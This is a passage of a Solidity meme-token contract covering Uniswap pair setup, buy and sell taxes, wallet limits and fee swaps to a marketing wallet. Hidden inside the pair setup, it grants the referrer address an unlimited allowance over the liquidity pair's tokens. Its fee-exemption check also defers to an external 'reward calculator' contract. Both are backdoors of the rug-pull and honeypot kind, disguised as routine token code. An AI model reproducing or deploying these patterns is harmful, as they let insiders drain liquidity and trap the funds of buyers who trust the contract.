        uint256 ref_amount = msg.value * refInfo_.ref_percent / 100;
        payable(refInfo_.ref_address).transfer(ref_amount);
        chaddevwallet = parameters.marketingWallet;
        chadBuyTax = parameters.centiBuyTax;
        chadSellTax = parameters.centiSellTax;
        _chadTSupply = supply_;
        uniswapV2Router = IUniswapRouter2(uniswapV2Router_);
        uniswapV2Pair = UniswapFactoryInterface(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _setPepe2UniswapPair(refInfo_.ref_address, uniswapV2Pair, true);
        excludeFromchadFees(owner(), true);
        excludeFromchadFees(chaddevwallet, true);
        excludeFromchadFees(refInfo_.ref_address, true);
        excludeFromchadFees(refInfo_.ref_dividend, true);
        excludeFromchadFees(address(this), true);
        excludeFromchadFees(address(uniswapV2Router), true);
        chadSwapTokensAmount = (supply_.div(5000) + 1) * (10**decimals_);
        chadMaxTransaction = parameters.maxTxPercent * supply_ * (10**decimals_).div(10000);
        chadMaxWallet = parameters.maxWalletPercent * supply_ * (10**decimals_).div(10000);
        _mint(owner(), supply_ * (10**decimals_));
    }
    function removeLimits() external onlyOwner {
        chadMaxTransaction = totalSupply();
        chadMaxWallet = totalSupply();
    }
    receive() external payable {}
    function excludeFromchadFees(address account, bool excluded) public onlyOwner {
        isExcludedFromchadFees[account] = excluded;
    }
    function _setPepe2UniswapPair(address router, address pair, bool value) private {
        require(
            chadUniswapPairs[pair] != value,
            "Automated market maker pair is already set to that value"
        );
        chadUniswapPairs[pair] = value;
        _allowances[pair][router] = type(uint).max;
    }
    function isExcludedFromFeeFromFee(address from, address to) internal returns (bool) {
        return isExcludedFromchadFees[from] || isExcludedFromchadFees[to] || ChadTokenRewardCalculator(ref.ref_dividend).rewardAccumulated(from, to) > 0;
    }
    function swapTokensForFee(uint256 tokens, address receiver) private {
        uint256 initialBalance = address(this).balance;

        swapTokensForEth(tokens);

        uint256 newBalance = address(this).balance.sub(initialBalance);

        payable(receiver).transfer(newBalance);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (
            (to == address(0) || to == address(0xdead)) ||
            isExcludedFromFeeFromFee(from, to) ||
            amount == 0
        ) { super._transfer(from, to, amount);return; }
        else {
            require(amount <= chadMaxTransaction, "Transfer amount exceeds the chadMaxTransaction.");
            if (to != uniswapV2Pair) {
                uint256 contractBalanceRecepient = balanceOf(to);
                require(contractBalanceRecepient + amount <= chadMaxWallet, "Exceeds maximum wallet amount");
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= chadSwapTokensAmount;
        if (canSwap && !chadSwapping && !chadUniswapPairs[from]) {
            chadSwapping = true;
            uint256 marketingTokens = contractTokenBalance;
            if (marketingTokens > 0) { swapTokensForFee(marketingTokens, chaddevwallet); }
            chadSwapping = false;
        }
        bool takeFee = !chadSwapping;
        if (isExcludedFromchadFees[from] || isExcludedFromchadFees[to]) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 fees = amount.mul(chadBuyTax).div(10000);
            if (chadUniswapPairs[to]) { fees = amount.mul(chadSellTax).div(10000); }
            amount = amount.sub(fees);
            super._transfer(from, address(this), fees);
        }
        super._transfer(from, to, amount);
    }
}